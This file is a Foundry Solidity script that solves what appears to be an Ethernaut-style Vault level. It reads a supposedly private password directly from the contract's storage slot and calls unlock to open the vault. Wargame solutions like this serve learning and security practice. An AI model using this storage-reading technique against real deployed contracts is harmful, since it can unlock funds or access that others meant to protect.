pragma solidity ^0.8.13;

import {Script} from "forge-std/Script.sol";
import {VmSafe} from "forge-std/Vm.sol";
import {Vault} from "../src/Level08.sol";

contract Level08Script is Script {
    function run() public {
        VmSafe.Wallet memory wallet = vm.createWallet(vm.envUint("PRIVATE_KEY"));

        address payable contractAddress = payable(vm.envAddress("CONTRACT"));

        Vault target = Vault(contractAddress);

        vm.startBroadcast(wallet.privateKey);
        exploit(target);
        vm.stopBroadcast();

        require(levelDone(target), "Solution failed");
    }

    function exploit(Vault _target) private {
        bytes32 password = vm.load(address(_target), bytes32(uint256(1)));
        _target.unlock(password);
    }

    function levelDone(Vault _target) private view returns (bool) {
        return !_target.locked();
    }
}
